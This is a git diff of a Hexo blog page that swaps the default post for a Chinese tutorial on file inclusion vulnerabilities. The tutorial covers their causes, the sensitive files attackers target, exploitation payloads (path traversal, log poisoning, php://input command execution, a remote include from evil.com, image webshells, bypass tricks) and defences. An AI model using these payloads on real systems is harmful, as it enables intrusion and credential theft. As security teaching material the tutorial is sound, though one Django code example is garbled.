@@ -6,20 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://erwuyishiqi-1017.github.io">
-  <title>Hello World | 二五一十七</title>
+  <title>文件包含漏洞 | 二五一十七</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="漏洞概述文件包含漏洞（File Inclusion Vulnerability）指攻击者通过控制文件包含函数的参数，读取任意文件或执行远程代码的漏洞类型。主要分为两类：  本地文件包含（LFI）：包含服务器本地文件 远程文件包含（RFI）：包含远程服务器文件（需特定配置）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://erwuyishiqi-1017.github.io/2025/02/12/hello-world/">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="https://erwuyishiqi-1017.github.io/2025/02/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
 <meta property="og:site_name" content="二五一十七">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="漏洞概述文件包含漏洞（File Inclusion Vulnerability）指攻击者通过控制文件包含函数的参数，读取任意文件或执行远程代码的漏洞类型。主要分为两类：  本地文件包含（LFI）：包含服务器本地文件 远程文件包含（RFI）：包含远程服务器文件（需特定配置）">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-02-12T06:37:59.120Z">
-<meta property="article:modified_time" content="2025-02-12T06:37:59.120Z">
+<meta property="article:published_time" content="2025-02-12T08:11:29.000Z">
+<meta property="article:modified_time" content="2025-03-11T04:33:35.344Z">
 <meta property="article:author" content="二五一十七">
+<meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary">
   
   
@@ -159,22 +160,22 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-文件包含漏洞" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      文件包含漏洞
     </h1>
   
 
 
   
   
-<a href="/2025/02/12/hello-world/" class="archive-article-date">
-        <time datetime="2025-02-12T06:37:59.120Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
+<a href="/2025/02/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+        <time datetime="2025-02-12T08:11:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
 </a>
 
   
@@ -187,7 +188,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">75字</span>
+      <span class="post-count">1.8k字</span>
     </span>
   </span>
 
@@ -196,7 +197,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">7分</span>
     </span>
   </span>
 </div>
@@ -207,19 +208,122 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>文件包含漏洞（File Inclusion Vulnerability）指攻击者通过控制文件包含函数的参数，读取任意文件或执行远程代码的漏洞类型。主要分为两类：</p>
+<ul>
+<li><strong>本地文件包含（LFI）</strong>：包含服务器本地文件</li>
+<li><strong>远程文件包含（RFI）</strong>：包含远程服务器文件（需特定配置）<span id="more"></span></li>
+</ul>
+<h2 id="漏洞成因及原理"><a href="#漏洞成因及原理" class="headerlink" title="漏洞成因及原理"></a>漏洞成因及原理</h2><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。<br>服务器执行PHP文件时，可以通过包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件。<br>为了代码更灵活，通常会把被包含的文件设置为变量 ，进行动态调用 ，从而导致客户端可以调用任意文件 ，造成文件包含漏洞。动态包含的文件路径参数，客户端可控 。web应用对用户的输入没有进行过滤或者严格过滤就带入文件包含函数中执行</p>
+<h3 id="核心原因"><a href="#核心原因" class="headerlink" title="核心原因"></a>核心原因</h3><ul>
+<li>动态包含文件时未验证用户输入</li>
+<li>使用危险函数包含文件路径</li>
+<li>PHP配置不当（<code>allow_url_include=On</code>）</li>
+<li>路径拼接处理不当</li>
+</ul>
+<h3 id="辅助因素"><a href="#辅助因素" class="headerlink" title="辅助因素"></a>辅助因素</h3><ul>
+<li>文件上传功能组合利用</li>
+<li>日志文件可读</li>
+<li>已知文件路径信息</li>
+<li>框架错误配置</li>
+</ul>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>用户输入恶意路径 → 程序动态包含文件 → 服务器加载指定文件 → 敏感信息泄露&#x2F;代码执行</p>
+<h3 id="包含方式对比"><a href="#包含方式对比" class="headerlink" title="包含方式对比"></a>包含方式对比</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>所需配置</th>
+<th>危害范围</th>
+<th>典型利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LFI</td>
+<td>无特殊要求</td>
+<td>本地文件系统</td>
+<td>读取&#x2F;etc&#x2F;passwd</td>
+</tr>
+<tr>
+<td>RFI</td>
+<td>allow_url_include&#x3D;On</td>
+<td>远程服务器</td>
+<td>加载远程Webshell</td>
+</tr>
+</tbody></table>
+<h4 id="本地文件包含漏洞-LFI"><a href="#本地文件包含漏洞-LFI" class="headerlink" title="本地文件包含漏洞(LFI)"></a>本地文件包含漏洞(LFI)</h4><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>（1）使用绝对路径：使用绝对路径直接读取<br>（2）使用相对路径进行读取：通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。</p>
+<h5 id="一些常见的敏感目录信息路径"><a href="#一些常见的敏感目录信息路径" class="headerlink" title="一些常见的敏感目录信息路径:"></a>一些常见的敏感目录信息路径:</h5><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows系统:</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">C:</span>\boot.ini <span class="comment">//查看系统版本</span></span><br><span class="line"><span class="symbol">C:</span>\windows\system32\inetsrv\MetaBase.xml <span class="comment">//IIS配置文件</span></span><br><span class="line"><span class="symbol">C:</span>\windows\repair\sam <span class="comment">//存储Windows系统初次安装的密码</span></span><br><span class="line"><span class="symbol">C:</span>\ProgramFiles\mysql\my.ini <span class="comment">//Mysql配置</span></span><br><span class="line"><span class="symbol">C:</span>\ProgramFiles\mysql\data\mysql\user.MYD <span class="comment">//MySQL root密码</span></span><br><span class="line"><span class="symbol">C:</span>\windows\php.ini <span class="comment">//php配置信息</span></span><br><span class="line"></span><br><span class="line">Linux/Unix系统:</span><br><span class="line"></span><br><span class="line"><span class="keyword">/etc/</span>password <span class="comment">//账户信息</span></span><br><span class="line"><span class="keyword">/etc/</span>shadow <span class="comment">//账户密码信息</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>apache2<span class="keyword">/conf/</span>httpd.conf <span class="comment">//Apache2默认配置文件</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>apache2<span class="keyword">/conf/</span>extra/httpd-vhost.conf <span class="comment">//虚拟网站配置</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>php5<span class="keyword">/lib/</span>php.ini <span class="comment">//PHP相关配置</span></span><br><span class="line"><span class="keyword">/etc/</span>httpd<span class="keyword">/conf/</span>httpd.conf <span class="comment">//Apache配置文件</span></span><br><span class="line"><span class="keyword">/etc/</span>my.conf <span class="comment">//mysql配置文件</span></span><br><span class="line"></span><br><span class="line">session常见存储路径:</span><br><span class="line"><span class="keyword">/var/</span>lib<span class="keyword">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="keyword">/var/</span>lib<span class="keyword">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="keyword">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="keyword">/tmp/</span>sessions/sess_PHPSESSID</span><br><span class="line">session文件格式:sess_phpsessid</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h2 id="关键函数-方法"><a href="#关键函数-方法" class="headerlink" title="关键函数&#x2F;方法"></a>关键函数&#x2F;方法</h2><h4 id="PHP高危函数"><a href="#PHP高危函数" class="headerlink" title="PHP高危函数"></a>PHP高危函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); <span class="comment">// 找不到被包含的文件只会产生警告，脚本继续执行</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); <span class="comment">// 找不到被包含的文件会产生致命错误，并停止脚本运行</span></span><br><span class="line"><span class="keyword">include_once</span>()  <span class="comment">// 单次包含</span></span><br><span class="line"><span class="keyword">require_once</span>()  <span class="comment">// 单次包含</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<h4 id="java相关"><a href="#java相关" class="headerlink" title="java相关"></a>java相关</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JSP包含机制</span></span><br><span class="line">&lt;jsp:include page=<span class="string">&quot;&lt;%= request.getParameter(&quot;</span>page<span class="string">&quot;) %&gt;&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="python相关"><a href="#python相关" class="headerlink" title="python相关"></a>python相关</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Flask模板包含漏洞示例</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/include&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">include</span>():</span><br><span class="line">    template = request.args.get(<span class="string">&#x27;template&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(template)  <span class="comment"># 危险操作</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="敏感文件读取"><a href="#敏感文件读取" class="headerlink" title="敏感文件读取"></a>敏感文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../etc/passwd</span><br><span class="line">?file=file:///C:/windows/win.ini</span><br></pre></td></tr></table></figure>
+<h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。<br>当我们安装Apache后，Apache会自动给生成两个日志文件，这两个日志文件分别是访问日志access_log和错误日志error_log（在windows上是access.log和error.log）Access.log为访问日志，记录所有对apache服务器进行请求的访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /&lt;?php phpinfo();?&gt; HTTP/1.1</span><br><span class="line">?file=../../var/log/apache2/access.log</span><br></pre></td></tr></table></figure>
+<h3 id="PHP伪协议利用"><a href="#PHP伪协议利用" class="headerlink" title="PHP伪协议利用"></a>PHP伪协议利用</h3><p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=config.php</span><br><span class="line">?file=php://input (POST DATA: &lt;?php system(&#x27;id&#x27;); ?&gt;)</span><br></pre></td></tr></table></figure>
+<h3 id="远程代码执行（远程文件包含）"><a href="#远程代码执行（远程文件包含）" class="headerlink" title="远程代码执行（远程文件包含）"></a>远程代码执行（远程文件包含）</h3><p>如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://evil.com/shell.txt</span><br></pre></td></tr></table></figure>
+<h3 id="配合文件上传"><a href="#配合文件上传" class="headerlink" title="配合文件上传"></a>配合文件上传</h3><p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 上传图片马到<span class="regexp">/uploads/</span><span class="number">1</span>.jpg</span><br><span class="line"><span class="number">2</span>. ?<span class="keyword">file</span>=..<span class="regexp">/uploads/</span><span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="SMB协议利用（windows）"><a href="#SMB协议利用（windows）" class="headerlink" title="SMB协议利用（windows）"></a>SMB协议利用（windows）</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=\\<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>\share\<span class="built_in">shell</span>.php</span><br></pre></td></tr></table></figure>
+<h3 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h3><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<ul>
+<li>找到Session内的可控变量</li>
+<li>Session文件可读写，并且知道存储路径</li>
+</ul>
+<h4 id="session常见存储路径"><a href="#session常见存储路径" class="headerlink" title="session常见存储路径"></a>session常见存储路径</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sessions/sess_PHPSESSID</span><br><span class="line">session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到</span><br></pre></td></tr></table></figure>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><table>
+<thead>
+<tr>
+<th>绕过类型</th>
+<th>示例</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>路径遍历</td>
+<td>….&#x2F;&#x2F;….&#x2F;&#x2F;etc&#x2F;passwd</td>
+<td>路径过滤不严</td>
+</tr>
+<tr>
+<td>Null字节截断</td>
+<td>..&#x2F;..&#x2F;etc&#x2F;passwd%00</td>
+<td>PHP&lt;5.3.4</td>
+</tr>
+<tr>
+<td>超长路径</td>
+<td>.&#x2F;.&#x2F;.&#x2F;[…重复…]&#x2F;etc&#x2F;passwd</td>
+<td>路径长度检测缺陷</td>
+</tr>
+<tr>
+<td>编码绕过</td>
+<td>%2e%2e%2f → ..&#x2F;</td>
+<td>解码后处理</td>
+</tr>
+</tbody></table>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单验证示例</span></span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;header.php&#x27;</span>, <span class="string">&#x27;footer.php&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h3><p>PHP配置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = Off</span><br><span class="line">open_basedir = /<span class="keyword">var</span>/www/html</span><br></pre></td></tr></table></figure>
+<p>Web服务器配置：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```<span class="section">location</span> <span class="regexp">~* (\.\./|%2e%2e%2f)</span> &#123; <span class="attribute">deny</span> all; &#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h3 id="代码防护"><a href="#代码防护" class="headerlink" title="代码防护"></a>代码防护</h3><ul>
+<li>固定前缀后缀：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./templates/&#x27;</span> . <span class="variable">$file</span> . <span class="string">&#x27;.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>文件路径限制：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Django安全示例</span></span><br><span class="line"><span class="keyword">from</span> django.views.static <span class="keyword">import</span> servedef protected_file(request, path):</span><br><span class="line"><span class="keyword">return</span> serve(request, path, document_root=<span class="string">&#x27;/safe/directory&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="其他措施"><a href="#其他措施" class="headerlink" title="其他措施"></a>其他措施</h3><ul>
+<li>禁用危险协议（php:&#x2F;&#x2F;、phar:&#x2F;&#x2F;）</li>
+<li>定期更新Web中间件</li>
+<li>设置文件系统权限最小化原则</li>
+</ul>
 
     
 
@@ -231,6 +335,17 @@
   <div class="article-info article-info-index">
     
     
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件包含</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
     
 
     
@@ -244,15 +359,20 @@
 
 <nav id="article-nav">
   
-    <a href="/2025/02/12/XSS(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC)%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2025/02/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          XSS(跨站脚本)笔记
+          反序列化漏洞
         
       </div>
     </a>
   
+  
+    <a href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件上传漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
@@ -277,7 +397,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因及原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.1.</span> <span class="toc-text">核心原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E5%9B%A0%E7%B4%A0"><span class="toc-number">2.2.</span> <span class="toc-text">辅助因素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94"><span class="toc-number">2.4.</span> <span class="toc-text">包含方式对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-LFI"><span class="toc-number">2.4.1.</span> <span class="toc-text">本地文件包含漏洞(LFI)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%B7%AF%E5%BE%84"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">一些常见的敏感目录信息路径:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0-%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">关键函数&#x2F;方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0"><span class="toc-number">3.0.1.</span> <span class="toc-text">PHP高危函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java%E7%9B%B8%E5%85%B3"><span class="toc-number">3.0.2.</span> <span class="toc-text">java相关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E7%9B%B8%E5%85%B3"><span class="toc-number">3.0.3.</span> <span class="toc-text">python相关</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.1.</span> <span class="toc-text">敏感文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.2.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">PHP伪协议利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">4.4.</span> <span class="toc-text">远程代码执行（远程文件包含）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.5.</span> <span class="toc-text">配合文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%EF%BC%88windows%EF%BC%89"><span class="toc-number">4.6.</span> <span class="toc-text">SMB协议利用（windows）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABSESSION%E6%96%87%E4%BB%B6"><span class="toc-number">4.7.</span> <span class="toc-text">包含SESSION文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 